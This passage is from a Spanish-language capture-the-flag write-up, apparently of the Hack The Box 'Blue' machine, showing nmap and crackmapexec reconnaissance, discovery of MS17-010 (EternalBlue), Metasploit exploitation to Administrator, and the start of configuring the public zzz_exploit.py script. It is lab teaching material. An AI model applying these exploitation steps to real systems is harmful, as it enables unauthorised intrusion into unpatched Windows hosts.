+<a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="mi">49153</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>        <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
+<a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="mi">49154</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>        <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
+<a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a><span class="mi">49155</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>        <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
+<a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a><span class="mi">49156</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>        <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
+<a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a><span class="mi">49157</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>        <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
+<a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a><span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">Host</span><span class="p">:</span> <span class="n">HARIS</span><span class="o">-</span><span class="n">PC</span><span class="p">;</span> <span class="n">OS</span><span class="p">:</span> <span class="n">Windows</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">microsoft</span><span class="p">:</span><span class="n">windows</span>
+<a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a>
+<a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a><span class="n">Host</span> <span class="n">script</span> <span class="n">results</span><span class="p">:</span>
+<a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a><span class="o">|</span> <span class="n">smb</span><span class="o">-</span><span class="n">os</span><span class="o">-</span><span class="n">discovery</span><span class="p">:</span> 
+<a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a><span class="o">|</span>   <span class="n">OS</span><span class="p">:</span> <span class="n">Windows</span> <span class="mi">7</span> <span class="n">Professional</span> <span class="mi">7601</span> <span class="n">Service</span> <span class="n">Pack</span> <span class="mi">1</span> <span class="p">(</span><span class="n">Windows</span> <span class="mi">7</span> <span class="n">Professional</span> <span class="mf">6.1</span><span class="p">)</span>
+<a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a><span class="o">|</span>   <span class="n">OS</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">microsoft</span><span class="p">:</span><span class="n">windows_7</span><span class="p">::</span><span class="n">sp1</span><span class="p">:</span><span class="n">professional</span>
+<a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a><span class="o">|</span>   <span class="n">Computer</span> <span class="n">name</span><span class="p">:</span> <span class="n">haris</span><span class="o">-</span><span class="n">PC</span>
+<a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a><span class="o">|</span>   <span class="n">NetBIOS</span> <span class="n">computer</span> <span class="n">name</span><span class="p">:</span> <span class="n">HARIS</span><span class="o">-</span><span class="n">PC</span>\<span class="n">x00</span>
+<a id="__codelineno-2-24" name="__codelineno-2-24" href="#__codelineno-2-24"></a><span class="o">|</span>   <span class="n">Workgroup</span><span class="p">:</span> <span class="n">WORKGROUP</span>\<span class="n">x00</span>
+<a id="__codelineno-2-25" name="__codelineno-2-25" href="#__codelineno-2-25"></a><span class="o">|</span><span class="n">_</span>  <span class="n">System</span> <span class="n">time</span><span class="p">:</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">26</span><span class="n">T20</span><span class="p">:</span><span class="mi">55</span><span class="p">:</span><span class="mi">46</span><span class="o">+</span><span class="mi">01</span><span class="p">:</span><span class="mi">00</span>
+<a id="__codelineno-2-26" name="__codelineno-2-26" href="#__codelineno-2-26"></a><span class="o">|</span> <span class="n">p2p</span><span class="o">-</span><span class="n">conficker</span><span class="p">:</span> 
+<a id="__codelineno-2-27" name="__codelineno-2-27" href="#__codelineno-2-27"></a><span class="o">|</span>   <span class="n">Checking</span> <span class="k">for</span> <span class="n">Conficker</span><span class="o">.</span><span class="n">C</span> <span class="ow">or</span> <span class="n">higher</span><span class="o">...</span>
+<a id="__codelineno-2-28" name="__codelineno-2-28" href="#__codelineno-2-28"></a><span class="o">|</span>   <span class="n">Check</span> <span class="mi">1</span> <span class="p">(</span><span class="n">port</span> <span class="mi">23691</span><span class="o">/</span><span class="n">tcp</span><span class="p">):</span> <span class="n">CLEAN</span> <span class="p">(</span><span class="n">Couldn</span><span class="s1">&#39;t connect)</span>
+<a id="__codelineno-2-29" name="__codelineno-2-29" href="#__codelineno-2-29"></a><span class="o">|</span>   <span class="n">Check</span> <span class="mi">2</span> <span class="p">(</span><span class="n">port</span> <span class="mi">4775</span><span class="o">/</span><span class="n">tcp</span><span class="p">):</span> <span class="n">CLEAN</span> <span class="p">(</span><span class="n">Couldn</span><span class="s1">&#39;t connect)</span>
+<a id="__codelineno-2-30" name="__codelineno-2-30" href="#__codelineno-2-30"></a><span class="o">|</span>   <span class="n">Check</span> <span class="mi">3</span> <span class="p">(</span><span class="n">port</span> <span class="mi">25778</span><span class="o">/</span><span class="n">udp</span><span class="p">):</span> <span class="n">CLEAN</span> <span class="p">(</span><span class="n">Timeout</span><span class="p">)</span>
+<a id="__codelineno-2-31" name="__codelineno-2-31" href="#__codelineno-2-31"></a><span class="o">|</span>   <span class="n">Check</span> <span class="mi">4</span> <span class="p">(</span><span class="n">port</span> <span class="mi">58031</span><span class="o">/</span><span class="n">udp</span><span class="p">):</span> <span class="n">CLEAN</span> <span class="p">(</span><span class="n">Failed</span> <span class="n">to</span> <span class="n">receive</span> <span class="n">data</span><span class="p">)</span>
+<a id="__codelineno-2-32" name="__codelineno-2-32" href="#__codelineno-2-32"></a><span class="o">|</span><span class="n">_</span>  <span class="mi">0</span><span class="o">/</span><span class="mi">4</span> <span class="n">checks</span> <span class="n">are</span> <span class="n">positive</span><span class="p">:</span> <span class="n">Host</span> <span class="ow">is</span> <span class="n">CLEAN</span> <span class="ow">or</span> <span class="n">ports</span> <span class="n">are</span> <span class="n">blocked</span>
+<a id="__codelineno-2-33" name="__codelineno-2-33" href="#__codelineno-2-33"></a><span class="o">|</span> <span class="n">smb2</span><span class="o">-</span><span class="n">time</span><span class="p">:</span> 
+<a id="__codelineno-2-34" name="__codelineno-2-34" href="#__codelineno-2-34"></a><span class="o">|</span>   <span class="n">date</span><span class="p">:</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">26</span><span class="n">T19</span><span class="p">:</span><span class="mi">55</span><span class="p">:</span><span class="mi">44</span>
+<a id="__codelineno-2-35" name="__codelineno-2-35" href="#__codelineno-2-35"></a><span class="o">|</span><span class="n">_</span>  <span class="n">start_date</span><span class="p">:</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">26</span><span class="n">T19</span><span class="p">:</span><span class="mi">48</span><span class="p">:</span><span class="mi">46</span>
+<a id="__codelineno-2-36" name="__codelineno-2-36" href="#__codelineno-2-36"></a><span class="o">|</span> <span class="n">smb</span><span class="o">-</span><span class="n">security</span><span class="o">-</span><span class="n">mode</span><span class="p">:</span> 
+<a id="__codelineno-2-37" name="__codelineno-2-37" href="#__codelineno-2-37"></a><span class="o">|</span>   <span class="n">account_used</span><span class="p">:</span> <span class="n">guest</span>
+<a id="__codelineno-2-38" name="__codelineno-2-38" href="#__codelineno-2-38"></a><span class="o">|</span>   <span class="n">authentication_level</span><span class="p">:</span> <span class="n">user</span>
+<a id="__codelineno-2-39" name="__codelineno-2-39" href="#__codelineno-2-39"></a><span class="o">|</span>   <span class="n">challenge_response</span><span class="p">:</span> <span class="n">supported</span>
+<a id="__codelineno-2-40" name="__codelineno-2-40" href="#__codelineno-2-40"></a><span class="o">|</span><span class="n">_</span>  <span class="n">message_signing</span><span class="p">:</span> <span class="n">disabled</span> <span class="p">(</span><span class="n">dangerous</span><span class="p">,</span> <span class="n">but</span> <span class="n">default</span><span class="p">)</span>
+<a id="__codelineno-2-41" name="__codelineno-2-41" href="#__codelineno-2-41"></a><span class="o">|</span><span class="n">_clock</span><span class="o">-</span><span class="n">skew</span><span class="p">:</span> <span class="n">mean</span><span class="p">:</span> <span class="o">-</span><span class="mi">19</span><span class="n">m56s</span><span class="p">,</span> <span class="n">deviation</span><span class="p">:</span> <span class="mi">34</span><span class="n">m36s</span><span class="p">,</span> <span class="n">median</span><span class="p">:</span> <span class="mi">1</span><span class="n">s</span>
+<a id="__codelineno-2-42" name="__codelineno-2-42" href="#__codelineno-2-42"></a><span class="o">|</span> <span class="n">smb2</span><span class="o">-</span><span class="n">security</span><span class="o">-</span><span class="n">mode</span><span class="p">:</span> 
+<a id="__codelineno-2-43" name="__codelineno-2-43" href="#__codelineno-2-43"></a><span class="o">|</span>   <span class="mi">2</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span> 
+<a id="__codelineno-2-44" name="__codelineno-2-44" href="#__codelineno-2-44"></a><span class="o">|</span><span class="n">_</span>    <span class="n">Message</span> <span class="n">signing</span> <span class="n">enabled</span> <span class="n">but</span> <span class="ow">not</span> <span class="n">required</span>
+<a id="__codelineno-2-45" name="__codelineno-2-45" href="#__codelineno-2-45"></a>
+<a id="__codelineno-2-46" name="__codelineno-2-46" href="#__codelineno-2-46"></a><span class="n">Read</span> <span class="n">data</span> <span class="n">files</span> <span class="n">from</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/../</span><span class="n">share</span><span class="o">/</span><span class="n">nmap</span>
+<a id="__codelineno-2-47" name="__codelineno-2-47" href="#__codelineno-2-47"></a><span class="n">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="o">.</span> <span class="n">Please</span> <span class="n">report</span> <span class="nb">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="o">.</span>
+</code></pre></div>
+<p>Como se puede observar, el servicio <code>smb</code> está presente, lo cual es muy común en los servicios de Windows. Además, hay otros puertos abiertos típicos de un servidor de Windows. Hemos logrado obtener información sobre la versión del sistema operativo de la máquina, que es <code>Windows 7 Professional</code>.</p>
+<p>Se conoce que el protocolo <code>smb</code> utiliza el puerto <code>445</code>. En este laboratorio, nos enfocaremos en escalar privilegios mediante este protocolo.</p>
+<h2 id="enumeracion-de-smb">Enumeración de SMB</h2>
+<p>Realizamos un escaneo al protocolo SMB, que es comúnmente utilizado por los sistemas Windows para compartir archivos, impresoras y otros recursos en la red. Ejecutamos todos los scripts de <code>nmap</code> para <code>smb-vuln</code>, los cuales buscan vulnerabilidades conocidas en servicios SMB. También utilizamos el escaneo <code>-sT</code> para conexión TCP, un método más confiable en comparación con otros tipos de escaneo. Sin embargo, este método es más lento y puede ser detectado por sistemas de seguridad. En este caso, optamos por este tipo de escaneo para identificar las vulnerabilidades presentes.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>nmap<span class="w"> </span>-p445<span class="w"> </span>-script<span class="o">=</span>smb-vuln-<span class="se">\*</span><span class="w"> </span>-sT<span class="w"> </span><span class="nv">$blue</span><span class="w"> </span>-oN<span class="w"> </span>smbScan
+</code></pre></div>
+<p>Obtenemos la siguiente salida al ejecutar el comando y podemos observar la vulnerabilidad que podemos utilizar para explotar este servicio.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.129.230.92</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.097</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="n">PORT</span>    <span class="n">STATE</span> <span class="n">SERVICE</span>
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="mi">445</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span>
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>
+<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="n">Host</span> <span class="n">script</span> <span class="n">results</span><span class="p">:</span>
+<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="o">|</span><span class="n">_smb</span><span class="o">-</span><span class="n">vuln</span><span class="o">-</span><span class="n">ms10</span><span class="o">-</span><span class="mi">054</span><span class="p">:</span> <span class="n">false</span>
+<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="o">|</span> <span class="n">smb</span><span class="o">-</span><span class="n">vuln</span><span class="o">-</span><span class="n">ms17</span><span class="o">-</span><span class="mi">010</span><span class="p">:</span> 
+<a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="o">|</span>   <span class="n">VULNERABLE</span><span class="p">:</span>
+<a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="o">|</span>   <span class="n">Remote</span> <span class="n">Code</span> <span class="n">Execution</span> <span class="n">vulnerability</span> <span class="ow">in</span> <span class="n">Microsoft</span> <span class="n">SMBv1</span> <span class="n">servers</span> <span class="p">(</span><span class="n">ms17</span><span class="o">-</span><span class="mi">010</span><span class="p">)</span>
+<a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="o">|</span>     <span class="n">State</span><span class="p">:</span> <span class="n">VULNERABLE</span>
+<a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a><span class="o">|</span>     <span class="n">IDs</span><span class="p">:</span>  <span class="n">CVE</span><span class="p">:</span><span class="n">CVE</span><span class="o">-</span><span class="mi">2017</span><span class="o">-</span><span class="mi">0143</span>
+<a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a><span class="o">|</span>     <span class="n">Risk</span> <span class="n">factor</span><span class="p">:</span> <span class="n">HIGH</span>
+<a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a><span class="o">|</span>       <span class="n">A</span> <span class="n">critical</span> <span class="n">remote</span> <span class="n">code</span> <span class="n">execution</span> <span class="n">vulnerability</span> <span class="n">exists</span> <span class="ow">in</span> <span class="n">Microsoft</span> <span class="n">SMBv1</span>
+<a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a><span class="o">|</span>        <span class="n">servers</span> <span class="p">(</span><span class="n">ms17</span><span class="o">-</span><span class="mi">010</span><span class="p">)</span><span class="o">.</span>
+<a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a><span class="o">|</span>           
+<a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a><span class="o">|</span>     <span class="n">Disclosure</span> <span class="n">date</span><span class="p">:</span> <span class="mi">2017</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">14</span>
+<a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a><span class="o">|</span>     <span class="n">References</span><span class="p">:</span>
+<a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a><span class="o">|</span>       <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">blogs</span><span class="o">.</span><span class="n">technet</span><span class="o">.</span><span class="n">microsoft</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">msrc</span><span class="o">/</span><span class="mi">2017</span><span class="o">/</span><span class="mi">05</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="n">customer</span><span class="o">-</span><span class="n">guidance</span><span class="o">-</span><span class="k">for</span><span class="o">-</span><span class="n">wannacrypt</span><span class="o">-</span><span class="n">attacks</span><span class="o">/</span>
+<a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a><span class="o">|</span>       <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">cve</span><span class="o">.</span><span class="n">mitre</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">cgi</span><span class="o">-</span><span class="nb">bin</span><span class="o">/</span><span class="n">cvename</span><span class="o">.</span><span class="n">cgi</span><span class="err">?</span><span class="n">name</span><span class="o">=</span><span class="n">CVE</span><span class="o">-</span><span class="mi">2017</span><span class="o">-</span><span class="mi">0143</span>
+<a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a><span class="o">|</span><span class="n">_</span>      <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">technet</span><span class="o">.</span><span class="n">microsoft</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">en</span><span class="o">-</span><span class="n">us</span><span class="o">/</span><span class="n">library</span><span class="o">/</span><span class="n">security</span><span class="o">/</span><span class="n">ms17</span><span class="o">-</span><span class="mf">010.</span><span class="n">aspx</span>
+<a id="__codelineno-4-23" name="__codelineno-4-23" href="#__codelineno-4-23"></a><span class="o">|</span><span class="n">_smb</span><span class="o">-</span><span class="n">vuln</span><span class="o">-</span><span class="n">ms10</span><span class="o">-</span><span class="mi">061</span><span class="p">:</span> <span class="n">NT_STATUS_OBJECT_NAME_NOT_FOUND</span>
+</code></pre></div>
+<p>Se puede observar al finalizar el escaneo, que posee una vulnerabilidad con CVE de <code>CVE:CVE-2017-0143</code>.</p>
+<p>Podemos observar otros recursos de la maquina con <code>crackmapexec</code></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>❯<span class="w"> </span>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$ip</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>SMB<span class="w">         </span><span class="m">10</span>.10.10.40<span class="w">     </span><span class="m">445</span><span class="w">    </span>HARIS-PC<span class="w">         </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">7</span><span class="w"> </span>Professional<span class="w"> </span><span class="m">7601</span><span class="w"> </span>Service<span class="w"> </span>Pack<span class="w"> </span><span class="m">1</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:HARIS-PC<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:haris-PC<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:False<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:True<span class="o">)</span>
+</code></pre></div>
+<h2 id="explotacion-utilizando-el-framework-de-metasploit">Explotación utilizando el framework de Metasploit</h2>
+<p>En este apartado vamos ayudarnos de la herramienta de <code>Metasploit</code>, para poder explotar esta maquina, realizamos la búsqueda de la vulnerabilidad en la base de datos de Metasploit.</p>
+<p><img alt="img" src="../img/blue/Pasted%20image%2020240526151354.png" /></p>
+<p>Vamos a utilizar el <code>exploit 0</code>, y configuramos los parámetros necesarios para realizar el escalamiento.</p>
+<p><img alt="img" src="../img/blue/Pasted%20image%2020240526151714.png" /></p>
+<p>Configuración de los parámetros, con ayuda de Metasploit se logra tener una conexión al servidor, y lograr tener el respectivo acceso al sistemas.</p>
+<p><img alt="img" src="../img/blue/Pasted%20image%2020240526152443.png" /></p>
+<p>Luego de obtener acceso a la maquina por medio de Metasploit, se puede observar que tenemos acceso a la línea de comandos de Windows, con lo cual ahora podemos acceder a los diferentes directorios del sistema.</p>
+<p><img alt="img" src="../img/blue/Pasted%20image%2020240526161044.png" /></p>
+<p>Navegamos  por los directorios del sistema, y logramos acceder como <code>Administrator</code> de Windows, obteniendo los máximos privilegios del sistema.</p>
+<p><img alt="img" src="../img/blue/Pasted%20image%2020240526161242.png" /></p>
+<h2 id="explotacion-utilizando-script-de-python">Explotación utilizando script de Python</h2>
+<p>Para explotar la vulnerabilidad <code>Eternalblue</code> en sistemas operativos Windows 7, utilizaremos una aplicación desarrollada en Python. Procederemos a analizar esta vulnerabilidad a continuación y podrás descargar la herramienta desde el siguiente <a href="https://github.com/worawit/MS17-010/tree/master">repositorio</a>.</p>
+<p>El exploit que nos ayudará a obtener acceso se llama <code>zzz_exploit.py</code>. Es importante tener en cuenta que la vulnerabilidad permite el acceso para un usuario anónimo.</p>
+<p><img alt="img" src="../img/blue/Pasted%20image%2020240626114511.png" /></p>
+<p>Al comprobar las ejecución de comandos con python2 y tener instalados las diferentes herramientas, nos debe de arrojar las siguientes opciones, primer paso para la comprobación de funcionamiento del script se debe de ejecutar <code>checker.py</code>, el cual nos arroja si el funcionamiento que se  va a realizar es correcto o no.</p>
+<p>Las librerías utilizadas son las siguientes, las cuales no están instaladas y deben de instalarse, se debe de utilizar python2 para poder ejecutar este script y las librerías de <code>impacket</code>, para el funcionamiento del script.</p>
+<p>La librería de <code>impacket</code> es muy utilizada para poder interactuar con protocolos de red de bajo nivel, como en este caso de SMB.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># importada dentro de los paquetes del repositorio para manejo de smb</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="kn">from</span><span class="w"> </span><span class="nn">mysmb</span><span class="w"> </span><span class="kn">import</span> <span class="n">MYSMB</span>
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="c1"># Utilizacion de libreria impacket</span>
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="kn">from</span><span class="w"> </span><span class="nn">impacket</span><span class="w"> </span><span class="kn">import</span> <span class="n">smb</span><span class="p">,</span> <span class="n">smbconnection</span><span class="p">,</span> <span class="n">nt_errors</span>
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="kn">from</span><span class="w"> </span><span class="nn">impacket.uuid</span><span class="w"> </span><span class="kn">import</span> <span class="n">uuidtup_to_bin</span>
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="kn">from</span><span class="w"> </span><span class="nn">impacket.dcerpc.v5.rpcrt</span><span class="w"> </span><span class="kn">import</span> <span class="n">DCERPCException</span>
+</code></pre></div>
+<p><img alt="img" src="../img/blue/Pasted%20image%2020240626123158.png" /></p>
+<p>Luego de configurar las dependencias debemos de hacer unos cambios al script <code>checker.py</code>, donde se deben de configurar algunas variables dentro del código, para hacer ejecutar adecuadamente el script.</p>
+<p><img alt="img" src="../img/blue/Pasted%20image%2020240626123347.png" /></p>
+<p>Ahora se puede observar que el funcionamiento del script ya nos arroja cosas positivas con las cuales podemos seguir avanzando en el escalamiento de privilegios, se obtiene varios <code>OK</code>, que ya nos permiten seguir avanzando, tenemos un namepy <code>samr</code> que podemos utilizarlo.</p>
+<p><img alt="img" src="../img/blue/Pasted%20image%2020240626124219.png" /></p>
+<p>Para poder correr ahora el Exploit <code>zzz_exploit.py</code> para obtener acceso a la maquina , debemos de realizar los siguientes cambios, y agregar el usuario <code>guest</code> en la variable <code>USERNAME</code>.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="ch">#!/usr/bin/python</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="kn">from</span><span class="w"> </span><span class="nn">impacket</span><span class="w"> </span><span class="kn">import</span> <span class="n">smb</span><span class="p">,</span> <span class="n">smbconnection</span>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="kn">from</span><span class="w"> </span><span class="nn">mysmb</span><span class="w"> </span><span class="kn">import</span> <span class="n">MYSMB</span>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="kn">from</span><span class="w"> </span><span class="nn">struct</span><span class="w"> </span><span class="kn">import</span> <span class="n">pack</span><span class="p">,</span> <span class="n">unpack</span><span class="p">,</span> <span class="n">unpack_from</span>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
+<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>
+<a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a><span class="sd">&#39;&#39;&#39;</span>
+<a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a><span class="sd">MS17-010 exploit for Windows 2000 and later by sleepya</span>
+<a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a>
+<a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a><span class="sd">Note:</span>
+<a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a><span class="sd">- The exploit should never crash a target (chance should be nearly 0%)</span>
+<a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a><span class="sd">- The exploit use the bug same as eternalromance and eternalsynergy, so named pipe is needed</span>
+<a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a>
+<a id="__codelineno-7-16" name="__codelineno-7-16" href="#__codelineno-7-16"></a><span class="sd">Tested on:</span>
+<a id="__codelineno-7-17" name="__codelineno-7-17" href="#__codelineno-7-17"></a><span class="sd">- Windows 2016 x64</span>
+<a id="__codelineno-7-18" name="__codelineno-7-18" href="#__codelineno-7-18"></a><span class="sd">- Windows 10 Pro Build 10240 x64</span>
+<a id="__codelineno-7-19" name="__codelineno-7-19" href="#__codelineno-7-19"></a><span class="sd">- Windows 2012 R2 x64</span>
+<a id="__codelineno-7-20" name="__codelineno-7-20" href="#__codelineno-7-20"></a><span class="sd">- Windows 8.1 x64</span>
+<a id="__codelineno-7-21" name="__codelineno-7-21" href="#__codelineno-7-21"></a><span class="sd">- Windows 2008 R2 SP1 x64</span>
+<a id="__codelineno-7-22" name="__codelineno-7-22" href="#__codelineno-7-22"></a><span class="sd">- Windows 7 SP1 x64</span>
+<a id="__codelineno-7-23" name="__codelineno-7-23" href="#__codelineno-7-23"></a><span class="sd">- Windows 2008 SP1 x64</span>
+<a id="__codelineno-7-24" name="__codelineno-7-24" href="#__codelineno-7-24"></a><span class="sd">- Windows 2003 R2 SP2 x64</span>
+<a id="__codelineno-7-25" name="__codelineno-7-25" href="#__codelineno-7-25"></a><span class="sd">- Windows XP SP2 x64</span>
+<a id="__codelineno-7-26" name="__codelineno-7-26" href="#__codelineno-7-26"></a><span class="sd">- Windows 8.1 x86</span>
+<a id="__codelineno-7-27" name="__codelineno-7-27" href="#__codelineno-7-27"></a><span class="sd">- Windows 7 SP1 x86</span>
+<a id="__codelineno-7-28" name="__codelineno-7-28" href="#__codelineno-7-28"></a><span class="sd">- Windows 2008 SP1 x86</span>
+<a id="__codelineno-7-29" name="__codelineno-7-29" href="#__codelineno-7-29"></a><span class="sd">- Windows 2003 SP2 x86</span>
+<a id="__codelineno-7-30" name="__codelineno-7-30" href="#__codelineno-7-30"></a><span class="sd">- Windows XP SP3 x86</span>
+<a id="__codelineno-7-31" name="__codelineno-7-31" href="#__codelineno-7-31"></a><span class="sd">- Windows 2000 SP4 x86</span>
+<a id="__codelineno-7-32" name="__codelineno-7-32" href="#__codelineno-7-32"></a><span class="sd">&#39;&#39;&#39;</span>
+<a id="__codelineno-7-33" name="__codelineno-7-33" href="#__codelineno-7-33"></a>
+<a id="__codelineno-7-34" name="__codelineno-7-34" href="#__codelineno-7-34"></a><span class="n">USERNAME</span> <span class="o">=</span> <span class="s1">&#39;guest&#39;</span>
